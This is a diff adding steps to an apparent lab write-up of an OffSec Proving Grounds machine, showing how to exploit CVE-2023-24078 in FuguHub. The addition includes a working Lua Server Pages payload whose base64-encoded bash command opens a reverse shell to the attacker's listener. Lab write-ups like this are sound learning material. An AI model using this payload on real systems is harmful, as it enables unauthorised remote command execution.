@@ -68,3 +68,47 @@ Visiting web server on port 8082.
 It appears that Port 8082 is hosting a recently set up FuguHub appliance, which means we need to establish our own admin account. Instant admin access lol.
 Searched for public exploits and found one.
 ![](Images/Hub3.png)
+It doesn’t match the version.
+### CVE-2023–24078 manually step by step
+https://medium.com/@nr_4x4/offsec-proving-grounds-hub-writeup-linux-lab-cve-2023-24078-in-detail-5619c914a84f
+Go to “Private Page”:
+![](Images/Hub4.png)
+Create New Page:
+![](Images/Hub5.png)
+![](Images/Hub6.png)
+Open /test : 
+![](Images/Hub7.png)
+Edit Page (Click on “file symbol”):
+![](Images/Hub8.png)
+Page editor opens:
+![](Images/Hub9.png)
+Click on “Expert”:
+![](Images/Hub10.png)
+![](Images/Hub11.png)
+Searched for LSP reverse shell and found below 
+https://github.com/the-emmons/lsp-reverse-shell/blob/main/rev.lsp
+![](Images/Hub12.png)
+Enable LSP and enter the ReverseShell
+![](Images/Hub13.png)
+Payload used :
+```sh
+<div style="margin-left:auto;margin-right: auto;width: 350px;">
+
+<div id="info">
+<h2>Lua Server Pages Reverse Shell</h2>
+<p>Delightful, isn't it?</p>
+</div>
+
+<?lsp if request:method() == "GET" then ?>
+   <?lsp os.execute("echo L2Jpbi9zaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjE2OS80NDQ0IDA+JjE= | base64 -d | bash") ?>
+<?lsp else ?>
+   You sent a <?lsp=request:method()?> request
+<?lsp end ?>
+
+</div>
+```
+![](Images/Hub14.png)
+!!! Start the listener on Kali before clicking Save !!!
+Got the shell.
+![](Images/Hub15.png)
+![](Images/Hub16.png)
